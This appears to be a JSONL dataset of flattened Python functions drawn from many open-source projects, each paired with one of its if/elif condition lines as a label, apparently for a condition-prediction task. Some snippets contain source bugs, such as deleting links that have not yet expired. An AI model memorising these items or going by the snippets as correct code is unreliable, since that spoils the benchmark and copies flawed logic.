{"input": "def run(self, root): footnotesDiv = self.footnotes.makeFootnotesDiv(root) if footnotesDiv is not None: result = self.footnotes.findFootnotesPlaceholder(root) if result: child, parent, isText = result ind = list(parent).index(child) if isText: parent.remove(child) parent.insert(ind, footnotesDiv) else: parent.insert(ind + 1, footnotesDiv) child.tail = None else: root.append(footnotesDiv)", "label": "if result :"}
{"input": "def ehp(self): if self.__ehp is None: if self.damagePattern is None: ehp = self.hp else: ehp = self.damagePattern.calculateEhp(self) self.__ehp = ehp return self.__ehp", "label": "if self . damagePattern is None :"}
{"input": "def literal(self): if self.peek('\"'): lit, lang, dtype = self.eat(r_literal).groups() if lang: lang = lang else: lang = None if dtype: dtype = dtype else: dtype = None if lang and dtype: raise ParseError(\"Can't have both a language and a datatype\") lit = unquote(lit) return Literal(lit, lang, dtype) return False", "label": "if dtype :"}
{"input": "def _purge(self, queue): \"\"\"Remove all messages from `queue`.\"\"\" count = 0 queue_find = \".\" + queue + \".msg\" folder = os.listdir(self.data_folder_in) while len(folder) > 0: filename = folder.pop() try: # only purge messages for the requested queue if filename.find(queue_find) < 0: continue filename = os.path.join(self.data_folder_in, filename) os.remove(filename) count += 1 except OSError: # we simply ignore its existence, as it was probably # processed by another worker pass return count", "label": "if filename . find ( queue_find ) < 0 :"}
{"input": "def check(data_dir, decrypter, read_only=False): fname = os.path.join(data_dir, DIGEST_NAME) if os.path.exists(fname): if decrypter is None: return False f = open(fname, \"rb\") s = f.read() f.close() return decrypter.decrypt(s) == MAGIC_STRING else: if decrypter is not None: if read_only: return False else: s = decrypter.encrypt(MAGIC_STRING) f = open(fname, \"wb\") f.write(s) f.close() return True", "label": "if decrypter is not None :"}
{"input": "def on_train_epoch_end(self, trainer, pl_module, outputs): epoch = trainer.current_epoch if self.unfreeze_backbone_at_epoch <= epoch: optimizer = trainer.optimizers[0] current_lr = optimizer.param_groups[0][\"lr\"] backbone_lr = self.previous_backbone_lr if epoch < 6: assert backbone_lr <= current_lr else: assert backbone_lr == current_lr", "label": "if epoch < 6 :"}
{"input": "def parse_rsync_url(location): \"\"\"Parse a rsync-style URL.\"\"\" if \":\" in location and \"@\" not in location: # SSH with no user@, zero or one leading slash. (host, path) = location.split(\":\", 1) user = None elif \":\" in location: # SSH with user@host:foo. user_host, path = location.split(\":\", 1) if \"@\" in user_host: user, host = user_host.rsplit(\"@\", 1) else: user = None host = user_host else: raise ValueError(\"not a valid rsync-style URL\") return (user, host, path)", "label": "if \"@\" in user_host :"}
{"input": "def populate_settings_dict(form, settings): new_settings = {} for key, value in iteritems(settings): try: # check if the value has changed if value == form[key].data: continue else: new_settings[key] = form[key].data except KeyError: pass return new_settings", "label": "if value == form [ key ] . data :"}
{"input": "def draw_boxes(image, boxes, scores=None, drop_score=0.5): if scores is None: scores = [1] * len(boxes) for (box, score) in zip(boxes, scores): if score < drop_score: continue box = np.reshape(np.array(box), [-1, 1, 2]).astype(np.int64) image = cv2.polylines(np.array(image), [box], True, (255, 0, 0), 2) return image", "label": "if score < drop_score :"}
{"input": "def update(self, instance, validated_data): for category, category_data in validated_data.items(): if not category_data: continue self.update_validated_settings(category_data) for field_name, field_value in category_data.items(): setattr(getattr(instance, category), field_name, field_value) return instance", "label": "if not category_data :"}
{"input": "def insert(self, menuName, position, label, command, underline=None): menu = self.getMenu(menuName) if menu: if underline is None: menu.insert(position, \"command\", label=label, command=command) else: menu.insert( position, \"command\", label=label, command=command, underline=underline )", "label": "if underline is None :"}
{"input": "def delete_old_links(): for doc in web.ctx.site.store.values(type=\"account-link\"): expiry_date = datetime.strptime(doc[\"expires_on\"], \"%Y-%m-%dT%H:%M:%S.%f\") now = datetime.utcnow() key = doc[\"_key\"] if expiry_date > now: print(\"Deleting link %s\" % (key)) del web.ctx.site.store[key] else: print(\"Retaining link %s\" % (key))", "label": "if expiry_date > now :"}
{"input": "def _object(o: edgedb.Object): ret = {} for attr in dir(o): try: link = o[attr] except (KeyError, TypeError): link = None if link: ret[attr] = serialize(link) else: ret[attr] = serialize(getattr(o, attr)) return ret", "label": "if link :"}
{"input": "def __init__(self, items): self._format = string.join(map(lambda item: item[0], items), \"\") self._items = items self._buffer_ = win32wnet.NCBBuffer(struct.calcsize(self._format)) for format, name in self._items: if len(format) == 1: if format == \"c\": val = \"\\0\" else: val = 0 else: l = int(format[:-1]) val = \"\\0\" * l self.__dict__[name] = val", "label": "if format == \"c\" :"}
{"input": "def prepare_text(text, style): body = [] for fragment, sty in parse_tags(text, style, subs.styles): fragment = fragment.replace(r\"\\h\", \" \") fragment = fragment.replace(r\"\\n\", \"\\n\") fragment = fragment.replace(r\"\\N\", \"\\n\") if sty.italic: fragment = \"<i>%s</i>\" % fragment if sty.underline: fragment = \"<u>%s</u>\" % fragment if sty.strikeout: fragment = \"<s>%s</s>\" % fragment body.append(fragment) return re.sub(\"\\n+\", \"\\n\", \"\".join(body).strip())", "label": "if sty . italic :"}
{"input": "def get_from_target(target): domains = set() if isinstance(target, str): if target.endswith(\".txt\"): logger.log(\"FATAL\", \"Use targets parameter for multiple domain names\") exit(1) domain = match_main_domain(target) if not domain: return domains domains.add(domain) return domains", "label": "if target . endswith ( \".txt\" ) :"}
{"input": "def iterate(self, prod_, rule_): newProduction = \"\" for i in range(len(prod_)): step = self.production[i] if step == \"W\": newProduction = newProduction + self.ruleW elif step == \"X\": newProduction = newProduction + self.ruleX elif step == \"Y\": newProduction = newProduction + self.ruleY elif step == \"Z\": newProduction = newProduction + self.ruleZ elif step != \"F\": newProduction = newProduction + step self.drawLength = self.drawLength * 0.5 self.generations += 1 return newProduction", "label": "if step == \"W\" :"}
{"input": "def cancel_pp(self, nzo_id): \"\"\"Change the status, so that the PP is canceled\"\"\" for nzo in self.history_queue: if nzo.nzo_id == nzo_id: nzo.abort_direct_unpacker() if nzo.pp_active: nzo.pp_active = False try: # Try to kill any external running process self.external_process.kill() logging.info( \"Killed external process %s\", self.external_process.args[0] ) except: pass return True return None", "label": "if nzo . nzo_id == nzo_id :"}
{"input": "def list_backends(debug): for backend in sorted( backends.getBackendList(), key=lambda backend: backend.identifier ): if debug: print( \"{:>15} : {} ({})\".format( backend.identifier, backend.__doc__, backend.__name__ ) ) else: print(\"{:>15} : {}\".format(backend.identifier, backend.__doc__))", "label": "if debug :"}
{"input": "def _geo_indices(cls, inspected=None): inspected = inspected or [] geo_indices = [] inspected.append(cls) for field in cls._fields.values(): if hasattr(field, \"document_type\"): field_cls = field.document_type if field_cls in inspected: continue if hasattr(field_cls, \"_geo_indices\"): geo_indices += field_cls._geo_indices(inspected) elif field._geo_index: geo_indices.append(field) return geo_indices", "label": "if hasattr ( field , \"document_type\" ) :"}
{"input": "def run_test_family(tests, mode_filter, files, open_func, *make_args): for test_func in tests: if test_func is None: out.write(\"\\n\") continue if mode_filter in test_func.file_open_mode: continue for s in test_func.file_sizes: name, size = files[size_names[s]] # name += file_ext args = tuple(f(name, size) for f in make_args) run_one_test(name, size, open_func, test_func, *args)", "label": "if mode_filter in test_func . file_open_mode :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 10: self.set_application_key(d.getPrefixedString()) continue if tt == 18: self.set_message(d.getPrefixedString()) continue if tt == 26: self.set_tag(d.getPrefixedString()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 18 :"}
{"input": "def _on_config_changed(self, option: str) -> None: if option in [\"zoom.levels\", \"zoom.default\"]: if not self._default_zoom_changed: factor = float(config.val.zoom.default) / 100 self.set_factor(factor) self._init_neighborlist()", "label": "if not self . _default_zoom_changed :"}
{"input": "def keyPressEvent(self, event): \"\"\"Add up and down arrow key events to built in functionality.\"\"\" keyPressed = event.key() if keyPressed in [Constants.UP_KEY, Constants.DOWN_KEY, Constants.TAB_KEY]: if keyPressed == Constants.UP_KEY: self.index = max(0, self.index - 1) elif keyPressed == Constants.DOWN_KEY: self.index = min(len(self.completerStrings) - 1, self.index + 1) elif keyPressed == Constants.TAB_KEY and self.completerStrings: self.tabPressed() if self.completerStrings: self.setTextToCompleterIndex() super(CueLineEdit, self).keyPressEvent(event)", "label": "if self . completerStrings :"}
{"input": "def maxRange(self): attrs = ( \"shieldTransferRange\", \"powerTransferRange\", \"energyDestabilizationRange\", \"empFieldRange\", \"ecmBurstRange\", \"maxRange\", ) for attr in attrs: maxRange = self.getModifiedItemAttr(attr, None) if maxRange is not None: return maxRange if self.charge is not None: delay = self.getModifiedChargeAttr(\"explosionDelay\", None) speed = self.getModifiedChargeAttr(\"maxVelocity\", None) if delay is not None and speed is not None: return delay / 1000.0 * speed", "label": "if delay is not None and speed is not None :"}
{"input": "def decref(self, *keys): for tileable_key, tileable_id in keys: if tileable_key not in self._executed_tileables: continue _graph_key, ids = self._executed_tileables[tileable_key] if tileable_id in ids: ids.remove(tileable_id) # for those same key tileables, do decref only when all those tileables are garbage collected if len(ids) != 0: continue self.delete_data(tileable_key)", "label": "if tileable_key not in self . _executed_tileables :"}
{"input": "def run(self): # Make some objects emit lights for obj in bpy.context.scene.objects: if \"modelId\" in obj: obj_id = obj[\"modelId\"] # In the case of the lamp if obj_id in self.lights: self._make_lamp_emissive(obj, self.lights[obj_id]) # Make the windows emit light if obj_id in self.windows: self._make_window_emissive(obj) # Also make ceilings slightly emit light if obj.name.startswith(\"Ceiling#\"): self._make_ceiling_emissive(obj)", "label": "if obj . name . startswith ( \"Ceiling#\" ) :"}
{"input": "def _create_bucket(self): \"\"\"Create remote S3 bucket if it doesn't exist\"\"\" resource = boto3.resource(\"s3\") try: resource.meta.client.head_bucket(Bucket=self.bucket) except ClientError as e: error_code = int(e.response[\"Error\"][\"Code\"]) if error_code == 404: resource.create_bucket(Bucket=self.bucket) else: raise", "label": "if error_code == 404 :"}
{"input": "def sort_sizes(size_list): \"\"\"Sorts sizes with extensions. Assumes that size is already in largest unit possible\"\"\" final_list = [] for suffix in [\" B\", \" KB\", \" MB\", \" GB\", \" TB\"]: sub_list = [ float(size[: -len(suffix)]) for size in size_list if size.endswith(suffix) and size[: -len(suffix)][-1].isnumeric() ] sub_list.sort() final_list += [(str(size) + suffix) for size in sub_list] # Skip additional loops if len(final_list) == len(size_list): break return final_list", "label": "if len ( final_list ) == len ( size_list ) :"}
{"input": "def rename_var(block: paddle.device.framework.Block, old_name: str, new_name: str): \"\"\" \"\"\" for op in block.ops: for input_name in op.input_arg_names: if input_name == old_name: op._rename_input(old_name, new_name) for output_name in op.output_arg_names: if output_name == old_name: op._rename_output(old_name, new_name) block._rename_var(old_name, new_name)", "label": "if output_name == old_name :"}
{"input": "def _GetParserChains(self, events): \"\"\"Return a dict with a plugin count given a list of events.\"\"\" parser_chains = {} for event in events: parser_chain = getattr(event, \"parser\", None) if not parser_chain: continue if parser_chain in parser_chains: parser_chains[parser_chain] += 1 else: parser_chains[parser_chain] = 1 return parser_chains", "label": "if not parser_chain :"}
{"input": "def context(self): # Needed to avoid Translate Toolkit construct ID # as context\\04source if self.template is not None: if self.template.id: return self.template.id if self.template.context: return self.template.context return self.template.getid() return self.unescape_csv(self.mainunit.getcontext())", "label": "if self . template . id :"}
{"input": "def _validate_min_max_value(field_name, value, opt): if isinstance(value, (int, float)): if value < opt[\"minValue\"] or value > opt[\"maxValue\"]: raise ValueError( \"Invalid value %s assigned \" \"to field %s.\\n\" % (value, field_name) ) elif isinstance(value, str): if len(value) < opt[\"minValue\"] or len(value) > opt[\"maxValue\"]: raise ValueError( \"Invalid value %s assigned \" \"to field %s.\\n\" % (value, field_name) )", "label": "if value < opt [ \"minValue\" ] or value > opt [ \"maxValue\" ] :"}
{"input": "def _incr_internal(key, instance=None, tags=None, amount=1): from sentry.app import tsdb if _should_sample(): amount = _sampled_value(amount) if instance: full_key = \"{}.{}\".format(key, instance) else: full_key = key try: tsdb.incr(tsdb.models.internal, full_key, count=amount) except Exception: logger = logging.getLogger(\"sentry.errors\") logger.exception(\"Unable to incr internal metric\")", "label": "if instance :"}
{"input": "def get(self, key, default=None, version=None): key = self.make_key(key, version=version) self.validate_key(key) fname = self._key_to_file(key) try: with open(fname, \"rb\") as f: exp = pickle.load(f) now = time.time() if exp < now: self._delete(fname) else: return pickle.load(f) except (IOError, OSError, EOFError, pickle.PickleError): pass return default", "label": "if exp < now :"}
{"input": "def on_execution_scenario(self, cpath, scenario): if isinstance(scenario, dict): self.check_scenario(cpath, scenario) elif isinstance(scenario, str): scenario_name = scenario scenario_path = Path(\"scenarios\", scenario_name) scenario = self.linter.get_config_value(scenario_path, raise_if_not_found=False) if not scenario: self.report( ConfigWarning.ERROR, \"undefined-scenario\", cpath, \"scenario %r is used but isn't defined\" % scenario_name, )", "label": "if not scenario :"}
{"input": "def getSubmitKey(request, response): titleId = request.bits[2] titleKey = request.bits[3] try: if blockchain.blockchain.suggest(titleId, titleKey): return success(request, response, \"Key successfully added\") else: return error(request, response, \"Key validation failed\") except LookupError as e: error(request, response, str(e)) except OSError as e: error(request, response, str(e)) except BaseException as e: error(request, response, str(e))", "label": "if blockchain . blockchain . suggest ( titleId , titleKey ) :"}
{"input": "def test_downstream_trials(trial_associated_artifact, trial_obj, sagemaker_session): # allow trial components to index, 30 seconds max for i in range(3): time.sleep(10) trials = trial_associated_artifact.downstream_trials( sagemaker_session=sagemaker_session ) if len(trials) > 0: break assert len(trials) == 1 assert trial_obj.trial_name in trials", "label": "if len ( trials ) > 0 :"}
{"input": "def get_subfield_asts(context, return_type, field_asts): subfield_asts = DefaultOrderedDict(list) visited_fragment_names = set() for field_ast in field_asts: selection_set = field_ast.selection_set if selection_set: subfield_asts = collect_fields( context, return_type, selection_set, subfield_asts, visited_fragment_names, ) return subfield_asts", "label": "if selection_set :"}
{"input": "def _handle_children(self, removed, added): # Stop all the removed children. for obj in removed: obj.stop() # Process the new objects. for obj in added: obj.set(scene=self.scene, parent=self) if isinstance(obj, ModuleManager): obj.source = self elif is_filter(obj): obj.inputs.append(self) if self.running: try: obj.start() except: exception()", "label": "if isinstance ( obj , ModuleManager ) :"}
{"input": "def __kmp_search(S, W): m = 0 i = 0 T = __kmp_table(W) while m + i < len(S): if S[m + i] == W[i]: i += 1 if i == len(W): yield m m += i - T[i] i = max(T[i], 0) else: m += i - T[i] i = max(T[i], 0)", "label": "if S [ m + i ] == W [ i ] :"}
{"input": "def connection(self, commit_on_success=False): with self._lock: if self._bulk_commit: if self._pending_connection is None: self._pending_connection = sqlite.connect(self.filename) con = self._pending_connection else: con = sqlite.connect(self.filename) try: if self.fast_save: con.execute(\"PRAGMA synchronous = 0;\") yield con if commit_on_success and self.can_commit: con.commit() finally: if not self._bulk_commit: con.close()", "label": "if self . _bulk_commit :"}
{"input": "def passed(self): for test in self.lints[0]: for template in self.lints[0][test][\"results\"]: results = self.lints[0][test][\"results\"][template] if results: if self._is_error(results) or self.strict: return False return True", "label": "if self . _is_error ( results ) or self . strict :"}
{"input": "def testCheckIPGenerator(self): for i, ip in self._ip_range(65536 if not unittest.F2B.fast else 1000): if i == 254: self.assertEqual(str(ip), \"127.0.0.255\") elif i == 255: self.assertEqual(str(ip), \"127.0.1.0\") elif i == 1000: self.assertEqual(str(ip), \"127.0.3.233\") elif i == 65534: self.assertEqual(str(ip), \"127.0.255.255\") elif i == 65535: self.assertEqual(str(ip), \"127.1.0.0\")", "label": "elif i == 255 :"}
{"input": "def _DecodeUnknownMessages(message, encoded_message, pair_type): \"\"\"Process unknown fields in encoded_message of a message type.\"\"\" field_type = pair_type.value.type new_values = [] all_field_names = [x.name for x in message.all_fields()] for name, value_dict in encoded_message.iteritems(): if name in all_field_names: continue value = PyValueToMessage(field_type, value_dict) new_pair = pair_type(key=name, value=value) new_values.append(new_pair) return new_values", "label": "if name in all_field_names :"}
{"input": "def test_apply_noise_model(): p = Program(RX(np.pi / 2, 0), RX(np.pi / 2, 1), CZ(0, 1), RX(np.pi / 2, 1)) noise_model = _decoherence_noise_model(_get_program_gates(p)) pnoisy = apply_noise_model(p, noise_model) for i in pnoisy: if isinstance(i, DefGate): pass elif isinstance(i, Pragma): assert i.command in [\"ADD-KRAUS\", \"READOUT-POVM\"] elif isinstance(i, Gate): assert i.name in NO_NOISE or not i.params", "label": "if isinstance ( i , DefGate ) :"}
{"input": "def i2h(self, pkt, x): if x is not None: if x < 0: warning(\"Fixed3_7: Internal value too negative: %d\" % x) x = 0 elif x > 3600000000: warning(\"Fixed3_7: Internal value too positive: %d\" % x) x = 3600000000 x = (x - 1800000000) * 1e-7 return x", "label": "elif x > 3600000000 :"}
{"input": "def onClicked(event): shaderConfig = dict() for child in self.shaderDefBox.children: defName = child.shaderDefine enabled = child.isChecked() try: if enabled: mat.addShaderDefine(defName) else: mat.removeShaderDefine(defName) except: pass # Reload material properties (update enabled states) and shader uniforms self.listUniforms(mat) self.listMaterialSettings(self.getSelectedObject())", "label": "if enabled :"}
{"input": "def is_mod(self, member: discord.Member) -> bool: \"\"\"Checks if a member is a mod or admin of their guild.\"\"\" try: member_snowflakes = member._roles # DEP-WARN for snowflake in await self._config.guild(member.guild).admin_role(): if member_snowflakes.has(snowflake): # DEP-WARN return True for snowflake in await self._config.guild(member.guild).mod_role(): if member_snowflakes.has(snowflake): # DEP-WARN return True except AttributeError: # someone passed a webhook to this pass return False", "label": "if member_snowflakes . has ( snowflake ) :"}
{"input": "def _verify_treestore(itr, tree_values): i = 0 while itr: values = tree_values[i] if treestore[itr][0] != values[0]: return False if treestore.iter_children(itr): if not _verify_treestore(treestore.iter_children(itr), values[1]): return False itr = treestore.iter_next(itr) i += 1 return True", "label": "if not _verify_treestore ( treestore . iter_children ( itr ) , values [ 1 ] ) :"}
{"input": "def _default_config(self): if sys.platform.startswith(\"win\"): return {\"name\": \"Command Prompt\", \"cmd\": \"cmd.exe\", \"env\": {}} else: if \"SHELL\" in os.environ: shell = os.environ[\"SHELL\"] if os.path.basename(shell) == \"tcsh\": cmd = [shell, \"-l\"] else: cmd = [shell, \"-i\", \"-l\"] else: cmd = [\"/bin/bash\", \"-i\", \"-l\"] return {\"name\": \"Login Shell\", \"cmd\": cmd, \"env\": {}}", "label": "if \"SHELL\" in os . environ :"}
{"input": "def _messageHandled(self, resultList): failures = 0 for (success, result) in resultList: if not success: failures += 1 log.err(result) if failures: msg = \"Could not send e-mail\" resultLen = len(resultList) if resultLen > 1: msg += \" ({} failures out of {} recipients)\".format(failures, resultLen) self.sendCode(550, networkString(msg)) else: self.sendCode(250, b\"Delivery in progress\")", "label": "if not success :"}
{"input": "def to_internal_value(self, data): site = get_current_site() pages_root = reverse(\"pages-root\") ret = [] for path in data: if path.startswith(pages_root): path = path[len(pages_root) :] # strip any final slash if path.endswith(\"/\"): path = path[:-1] page = get_page_from_path(site, path) if page: ret.append(page) return ret", "label": "if path . endswith ( \"/\" ) :"}
{"input": "def _prune(self): with self.lock: entries = self._list_dir() if len(entries) > self._threshold: now = time.time() try: for i, fpath in enumerate(entries): remove = False f = LockedFile(fpath, \"rb\") exp = pickle.load(f.file) f.close() remove = exp <= now or i % 3 == 0 if remove: self._del_file(fpath) except Exception: pass", "label": "if remove :"}
{"input": "def get_ax_arg(uri): if not ax_ns: return u\"\" prefix = \"openid.\" + ax_ns + \".type.\" ax_name = None for name in self.request.arguments.keys(): if self.get_argument(name) == uri and name.startswith(prefix): part = name[len(prefix) :] ax_name = \"openid.\" + ax_ns + \".value.\" + part break if not ax_name: return u\"\" return self.get_argument(ax_name, u\"\")", "label": "if self . get_argument ( name ) == uri and name . startswith ( prefix ) :"}
{"input": "def _generate_expression(self): # turn my _format attribute into the _expression attribute e = [] for part in PARSE_RE.split(self._format): if not part: continue elif part == \"{{\": e.append(r\"\\{\") elif part == \"}}\": e.append(r\"\\}\") elif part[0] == \"{\" and part[-1] == \"}\": # this will be a braces-delimited field to handle e.append(self._handle_field(part)) else: # just some text to match e.append(REGEX_SAFETY.sub(self._regex_replace, part)) return \"\".join(e)", "label": "elif part == \"{{\" :"}
{"input": "def get_clean_username(user): try: username = force_text(user) except AttributeError: # AnonymousUser may not have USERNAME_FIELD username = \"anonymous\" else: # limit changed_by and created_by to avoid problems with Custom User Model if len(username) > PAGE_USERNAME_MAX_LENGTH: username = u\"{0}... (id={1})\".format( username[: PAGE_USERNAME_MAX_LENGTH - 15], user.pk, ) return username", "label": "if len ( username ) > PAGE_USERNAME_MAX_LENGTH :"}
{"input": "def process_request(self, request): for old, new in self.names_name: request.uri = request.uri.replace(old, new) if is_text_payload(request) and request.body: try: body = ( str(request.body, \"utf-8\") if isinstance(request.body, bytes) else str(request.body) ) except TypeError: # python 2 doesn't allow decoding through str body = str(request.body) if old in body: request.body = body.replace(old, new) return request", "label": "if old in body :"}
{"input": "def get_config_variable(self, name, methods=(\"env\", \"config\"), default=None): value = None config_name, envvar_name = self.session_var_map[name] if methods is not None: if \"env\" in methods and value is None: value = os.environ.get(envvar_name) if \"config\" in methods and value is None: value = self.config_file_vars.get(config_name) else: value = default return value", "label": "if \"config\" in methods and value is None :"}
{"input": "def get_field_by_name(obj, field): # Dereference once if obj.type.code == gdb.TYPE_CODE_PTR: obj = obj.dereference() for f in re.split(\"(->|\\.|\\[\\d+\\])\", field): if not f: continue if f == \"->\": obj = obj.dereference() elif f == \".\": pass elif f.startswith(\"[\"): n = int(f.strip(\"[]\")) obj = obj.cast(obj.dereference().type.pointer()) obj += n obj = obj.dereference() else: obj = obj[f] return obj", "label": "if f == \"->\" :"}
{"input": "def read_subpkgdata_dict(pkg, d): ret = {} subd = read_pkgdatafile(get_subpkgedata_fn(pkg, d)) for var in subd: newvar = var.replace(\"_\" + pkg, \"\") if newvar == var and var + \"_\" + pkg in subd: continue ret[newvar] = subd[var] return ret", "label": "if newvar == var and var + \"_\" + pkg in subd :"}
{"input": "def _classify_volume(self, ctxt, volumes): bypass_volumes = [] replica_volumes = [] for v in volumes: volume_type = self._get_volume_replicated_type(ctxt, v) grp = v.group if grp and utils.is_group_a_type(grp, \"consistent_group_replication_enabled\"): continue elif volume_type and v.status in [\"available\", \"in-use\"]: replica_volumes.append(v) else: bypass_volumes.append(v) return bypass_volumes, replica_volumes", "label": "elif volume_type and v . status in [ \"available\" , \"in-use\" ] :"}
{"input": "def _ensure_entity_values(self): entities_values = { entity.name: self._get_entity_values(entity) for entity in self.entities } for intent in self.intents: for utterance in intent.utterances: for chunk in utterance.slot_chunks: if chunk.text is not None: continue try: chunk.text = next(entities_values[chunk.entity]) except StopIteration: raise DatasetFormatError( \"At least one entity value must be provided for \" \"entity '%s'\" % chunk.entity ) return self", "label": "if chunk . text is not None :"}
{"input": "def _consume_msg(self): async for data in self._stream: stream = data.get(\"ev\") if stream: await self._dispatch(data) elif data.get(\"status\") == \"disconnected\": # Polygon returns this on an empty 'ev' id.. data[\"ev\"] = \"status\" await self._dispatch(data) raise ConnectionResetError( \"Polygon terminated connection: \" f'({data.get(\"message\")})' )", "label": "elif data . get ( \"status\" ) == \"disconnected\" :"}
{"input": "def GetHeaderWidth(self): \"\"\"Returns the header window width, in pixels.\"\"\" if not self._headerWidth: count = self.GetColumnCount() for col in range(count): if not self.IsColumnShown(col): continue self._headerWidth += self.GetColumnWidth(col) if self.HasAGWFlag(ULC_FOOTER): self._footerWidth = self._headerWidth return self._headerWidth", "label": "if not self . IsColumnShown ( col ) :"}
{"input": "def testCheckIPGenerator(self): for i, ip in self._ip_range(65536 if not unittest.F2B.fast else 1000): if i == 254: self.assertEqual(str(ip), \"127.0.0.255\") elif i == 255: self.assertEqual(str(ip), \"127.0.1.0\") elif i == 1000: self.assertEqual(str(ip), \"127.0.3.233\") elif i == 65534: self.assertEqual(str(ip), \"127.0.255.255\") elif i == 65535: self.assertEqual(str(ip), \"127.1.0.0\")", "label": "if i == 254 :"}
{"input": "def childrenTodo(self, p=None): if p is None: p = self.c.currentPosition() for p in p.children(): if self.getat(p.v, \"priority\") != 9999: continue self.setat(p.v, \"priority\", 19) self.loadIcons(p)", "label": "if self . getat ( p . v , \"priority\" ) != 9999 :"}
{"input": "def __init__(self, **kwargs): super(DepthwiseSeparableASPPModule, self).__init__(**kwargs) for i, dilation in enumerate(self.dilations): if dilation > 1: self[i] = DepthwiseSeparableConvModule( self.in_channels, self.channels, 3, dilation=dilation, padding=dilation, norm_cfg=self.norm_cfg, act_cfg=self.act_cfg, )", "label": "if dilation > 1 :"}
{"input": "def test_char(self): for x in range(256): c = System.Char.Parse(chr(x)) self.assertEqual(c, chr(x)) self.assertEqual(chr(x), c) if c == chr(x): pass else: self.assertTrue(False) if not c == chr(x): self.assertTrue(False) if chr(x) == c: pass else: self.assertTrue(False) if not chr(x) == c: self.assertTrue(False)", "label": "if not c == chr ( x ) :"}
{"input": "def create_model_handler(ns, model_type): @route(f\"/<provider>/{ns}/<model_id>\") @use_provider def handle(req, provider, model_id): # special cases: # fuo://<provider>/users/me -> show current logged user if model_type == ModelType.user: if model_id == \"me\": user = getattr(provider, \"_user\", None) if user is None: raise CmdException(f\"log in provider:{provider.identifier} first\") return user model = get_model_or_raise(provider, model_type, model_id) return model", "label": "if model_type == ModelType . user :"}
{"input": "def __str__(self, prefix=\"\", printElemNumber=0): res = \"\" if self.has_key_: res += prefix + (\"key: %s\\n\" % self.DebugFormatString(self.key_)) cnt = 0 for e in self.value_: elm = \"\" if printElemNumber: elm = \"(%d)\" % cnt res += prefix + (\"value%s: %s\\n\" % (elm, self.DebugFormatString(e))) cnt += 1 if self.has_partial_: res += prefix + (\"partial: %s\\n\" % self.DebugFormatBool(self.partial_)) return res", "label": "if printElemNumber :"}
{"input": "def set_value_type_index(self, rows: list, value_type_index: int): for row in rows: label = self.message_type[row] if not label.is_checksum_label: label.value_type_index = value_type_index self.protocol_label_updated.emit(label) self.update()", "label": "if not label . is_checksum_label :"}
{"input": "def get_model_param(self, job_id, cpn_name, role, party_id): result = None party_id = str(party_id) try: result = self.client.component.output_model( job_id=job_id, role=role, party_id=party_id, component_name=cpn_name ) if \"data\" not in result: raise ValueError( f\"job {job_id}, component {cpn_name} has no output model param\" ) return result[\"data\"] except: raise ValueError(\"Cannot get output model, err msg: \")", "label": "if \"data\" not in result :"}
{"input": "def validate(self) -> None: if self.query: if not self.sysupgrade: for arg_name in (\"aur\", \"repo\"): if getattr(self, arg_name): raise MissingArgument(\"sysupgrade\", arg_name)", "label": "if getattr ( self , arg_name ) :"}
{"input": "def print_nested_help(self, args: argparse.Namespace) -> None: level = 0 parser = self.main_parser while True: if parser._subparsers is None: break if parser._subparsers._actions is None: break choices = parser._subparsers._actions[-1].choices value = getattr(args, \"level_%d\" % level) if value is None: parser.print_help() return if not choices: break if isinstance(choices, dict): parser = choices[value] else: return level += 1", "label": "if parser . _subparsers . _actions is None :"}
{"input": "def merge(self, abort=False, message=None): \"\"\"Merge remote branch or reverts the merge.\"\"\" if abort: self.execute([\"update\", \"--clean\", \".\"]) elif self.needs_merge(): if self.needs_ff(): self.execute([\"update\", \"--clean\", \"remote(.)\"]) else: self.configure_merge() # Fallback to merge try: self.execute([\"merge\", \"-r\", \"remote(.)\"]) except RepositoryException as error: if error.retcode == 255: # Nothing to merge return raise self.execute([\"commit\", \"--message\", \"Merge\"])", "label": "if error . retcode == 255 :"}
{"input": "def parseArtistIds(cls, page): ids = list() js = demjson.decode(page) if \"error\" in js and js[\"error\"]: raise PixivException(\"Error when requesting Fanbox\", 9999, page) if \"body\" in js and js[\"body\"] is not None: js_body = js[\"body\"] if \"supportingPlans\" in js[\"body\"]: js_body = js_body[\"supportingPlans\"] for creator in js_body: ids.append(creator[\"user\"][\"userId\"]) return ids", "label": "if \"supportingPlans\" in js [ \"body\" ] :"}
{"input": "def ignore(self, other): if isinstance(other, Suppress): if other not in self.ignoreExprs: super().ignore(other) if self.expr is not None: self.expr.ignore(self.ignoreExprs[-1]) else: super().ignore(other) if self.expr is not None: self.expr.ignore(self.ignoreExprs[-1]) return self", "label": "if self . expr is not None :"}
{"input": "def execute(self): func = self.func is_batch_func = getattr(func, \"_task_batch\", False) g[\"current_task_is_batch\"] = is_batch_func g[\"current_tasks\"] = [self] try: if is_batch_func: return func([{\"args\": self.args, \"kwargs\": self.kwargs}]) else: return func(*self.args, **self.kwargs) finally: g[\"current_task_is_batch\"] = None g[\"current_tasks\"] = None", "label": "if is_batch_func :"}
{"input": "def fn(value=None): for i in [-1, 0, 1, 2, 3, 4]: if i < 0: continue elif i == 0: yield 0 elif i == 1: yield 1 i = 0 yield value yield 2 else: try: v = i / value except: v = i yield v", "label": "elif i == 1 :"}
{"input": "def get_instrumentation_key(url): data = url.split(\"//\")[1] try: uuid.UUID(data) except ValueError: values = data.split(\"/\") if len(values) != 2: AppInsightsHelper.log.warning(\"Bad format: '%s'\" % url) return AppInsightsHelper._get_instrumentation_key(values[0], values[1]) return data", "label": "if len ( values ) != 2 :"}
{"input": "def get_correct(ngrams_ref, ngrams_test, correct, total): for rank in ngrams_test: for chain in ngrams_test[rank]: total[rank] += ngrams_test[rank][chain] if chain in ngrams_ref[rank]: correct[rank] += min(ngrams_test[rank][chain], ngrams_ref[rank][chain]) return correct, total", "label": "if chain in ngrams_ref [ rank ] :"}
{"input": "def _content_type_params__set(self, value_dict): if not value_dict: del self.content_type_params return params = [] for k, v in sorted(value_dict.items()): if not _OK_PARAM_RE.search(v): v = '\"%s\"' % v.replace('\"', '\\\\\"') params.append(\"; %s=%s\" % (k, v)) ct = self.headers.pop(\"Content-Type\", \"\").split(\";\", 1)[0] ct += \"\".join(params) self.headers[\"Content-Type\"] = ct", "label": "if not _OK_PARAM_RE . search ( v ) :"}
